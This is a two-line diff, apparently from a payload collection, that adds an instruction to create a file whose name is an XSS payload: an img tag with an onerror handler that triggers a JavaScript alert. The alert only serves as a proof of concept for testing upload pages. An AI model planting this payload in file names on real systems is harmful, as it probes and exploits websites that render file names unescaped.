@@ -1,0 +1,2 @@
+Make this as a file name:
+<img src=x onerror=alert("thecyberworld")>.png
